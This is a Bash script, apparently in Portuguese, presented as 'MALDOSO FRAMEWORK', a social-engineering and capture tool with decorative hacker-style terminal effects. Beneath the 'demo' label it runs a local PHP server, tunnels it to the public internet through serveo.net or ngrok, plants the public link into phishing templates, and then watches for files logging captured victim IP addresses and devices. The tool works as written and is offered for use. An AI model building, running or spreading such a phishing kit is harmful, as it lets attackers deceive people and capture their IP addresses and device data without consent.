#!/bin/bash
# =====================================================
# MALDOSO FRAMEWORK - DEMO VISUAL
# Terminal Hacker Aesthetic Framework
# =====================================================

# ================== CORES ==================
GREEN="\e[1;92m"
CYAN="\e[1;96m"
PURPLE="\e[1;95m"
YELLOW="\e[1;93m"
RED="\e[1;91m"
GRAY="\e[1;90m"
WHITE="\e[1;97m"
RESET="\e[0m"
BOLD="\e[1m"
DIM="\e[2m"

# ================== ÍCONES / EMOJIS ==================
ICON_OK="🟢 ✔"
ICON_INFO="ℹ️"
ICON_WAIT="⏳"
ICON_WARN="⚠️"
ICON_ERR="❌"
ICON_CAP="📸 🎯"
ICON_NET="🌐"

trap 'printf "\n${YELLOW}${ICON_WARN} Encerrando...${RESET}\n"; exit 0' INT
clear

# ================== UTIL ==================
separator() {
  printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
}

timestamp() {
  date '+%H:%M:%S'
}

# === COLE A FUNÇÃO AQUI ===
log() {
  printf "${GRAY}[%s]${RESET} ${CYAN}${ICON_INFO}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
  }

# ================== LOGS COM CHARME ==================
success() {
  printf "${GRAY}[%s]${RESET} ${GREEN}${ICON_OK}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

info() {
  printf "${GRAY}[%s]${RESET} ${CYAN}${ICON_INFO}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

wait_msg() {
  printf "${GRAY}[%s]${RESET} ${PURPLE}${ICON_WAIT}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

capture() {
  printf "${GRAY}[%s]${RESET} ${GREEN}${ICON_CAP}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

server_msg() {
  printf "${GRAY}[%s]${RESET} ${CYAN}${ICON_NET}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

warn() {
  printf "${GRAY}[%s]${RESET} ${YELLOW}${ICON_WARN}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

error() {
  printf "${GRAY}[%s]${RESET} ${RED}${ICON_ERR}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

# ================== EFEITO GLITCH ==================
glitch_text() {
  final="$1"
  charset='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%'
  length=${#final}

  for _ in {1..6}; do
    out=""
    for ((i=0; i<length; i++)); do
      [[ "${final:$i:1}" == " " ]] && out+=" " || out+=${charset:RANDOM%${#charset}:1}
    done
    printf "\r${CYAN}%s${RESET}" "$out"
    sleep 0.05
  done
  printf "\r${GREEN}%s${RESET}\n" "$final"
}

# ================== SPINNER ==================
spinner() {
  local spin='|/-\'
  for i in {1..24}; do
    printf "\r${PURPLE}%s${RESET} ${GRAY}Inicializando módulos...${RESET}" "${spin:i%4:1}"
    sleep 0.07
  done
  printf "\r${GREEN}${ICON_OK}${RESET} ${GRAY}Módulos carregados${RESET}\n"
}

# ================== INTRO ==================
intro() {
  clear
  for _ in {1..3}; do
    printf "${GREEN}%s${RESET}\n" "$(head /dev/urandom | tr -dc 'A-Z0-9' | head -c $(tput cols))"
    sleep 0.04
  done
  clear
}

# ================== BANNER ==================
banner() {
  separator
  printf "${GREEN}${BOLD}"
  cat << "EOF"
███╗   ███╗ █████╗ ██╗     ██████╗  ██████╗ ███████╗ ██████╗
████╗ ████║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔════╝██╔═══██╗
██╔████╔██║███████║██║     ██║  ██║██║   ██║███████╗██║   ██║
██║╚██╔╝██║██╔══██║██║     ██║  ██║██║   ██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████╗██████╔╝╚██████╔╝███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝
EOF
  printf "${RESET}"
  separator
  printf "${GREEN}>> Framework de Engenharia Social & Captura <<${RESET}\n"
  printf "${GRAY}:: Autor  : Duzinn${RESET}\n"
  printf "${GRAY}:: Versão : 1.0${RESET}\n"
  printf "${GRAY}:: Modo   : DEMO VISUAL${RESET}\n"
  separator
}

# ================== CONTROLE ==================
stop() {
pkill -f ngrok > /dev/null 2>&1
pkill -f php > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || {
log "${ERR} PHP não está instalado. Abortando."
exit 1
}
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
success "IP registrado no sistema"
cat ip.txt >> saved.ip.txt
}

checkfound() {
log "${WAIT} Aguardando alvos... Ctrl + C para sair"
while true; do
  if [[ -e "ip.txt" && $ip_captured == false ]]; then
    success "IP registrado no sistema"
    catch_ip
  ip_captured=true
fi

  sleep 0.5
  if [[ -e "Log.log" ]]; then
    capture "Dispositivo ${GREEN}CAPTURADO${RESET} com sucesso"
    rm -rf Log.log
  fi
  sleep 0.5
done
}

server() {
command -v ssh > /dev/null 2>&1 || {
log "${ERR} SSH não está instalado. Abortando."
exit 1
}

log "${INFO} Iniciando Serveo..."
pkill -f php > /dev/null 2>&1

if [[ $subdomain_resp == true ]]; then
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R $subdomain:80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
else
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R 80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
fi

sleep 8
log "${INFO} Iniciando servidor PHP (localhost:3333)..."
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &

sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
log "${OK} Link direto: ${GREEN}$send_link${RESET}"
}

payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed "s+forwarding_link+$send_link+g" maldoso.html > index2.html
sed "s+forwarding_link+$send_link+g" template.php > index.php
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed "s+forwarding_link+$link+g" maldoso.html > index2.html
sed "s+forwarding_link+$link+g" template.php > index.php
}

ngrok_server() {
command -v unzip > /dev/null 2>&1 || exit 1
command -v wget > /dev/null 2>&1 || exit 1

if [[ ! -e ngrok ]]; then
log "${INFO} Baixando ngrok..."
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
fi

info "Iniciando servidor local"
spinner
wait_msg "Aguardando conexões"
sleep 1.2
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
info "Iniciando servidor online"
spinner
./ngrok http 3333 > /dev/null 2>&1 &
capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
log "${OK} Link direto: ${GREEN}$link${RESET}"

payload_ngrok
checkfound
}

start1() {
  rm -f sendlink
  separator
  printf "${GREEN}[01]${RESET} ${GRAY}Servidor Local (demo)${RESET}\n"
  printf "${GREEN}[02]${RESET} ${GRAY}Servidor Online (demo)${RESET}\n"
  printf "${GREEN}[00]${RESET} ${GRAY}Sair${RESET}\n"
  separator

  read -p "$(printf "${PURPLE}➜ Escolha uma opção: ${RESET}")" option_server

  case "$option_server" in
    1|"01")
      start
      ;;
    2|"02")
      ngrok_server
      ;;
    0|"00")
      warn "Encerrando framework"
      sleep 0.6
      clear
      exit 0
      ;;
    *)
      warn "Opção inválida"
      sleep 1
      clear
      start1
      ;;
  esac
}

start() {
default_subdomain="maldoso$RANDOM"
read -p "$(echo -e ${GRAY}'[+] Escolher subdomínio? [Y/n]: '${RESET})" choose_sub
choose_sub="${choose_sub:-Y}"

if [[ $choose_sub =~ ^[Yy]$ ]]; then
subdomain_resp=true
read -p "$(echo -e ${GRAY}'[+] Subdomínio (default: '${default_subdomain}'):'${RESET})" subdomain
subdomain="${subdomain:-$default_subdomain}"
fi

info "Iniciando servidor online"
spinner
capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
sleep 1
server
payload
checkfound
}

# ================== EXECUÇÃO ==================
intro
glitch_text "MALDOSO FRAMEWORK"
glitch_text "Inicializando ambiente"
spinner
banner
dependencies
start1
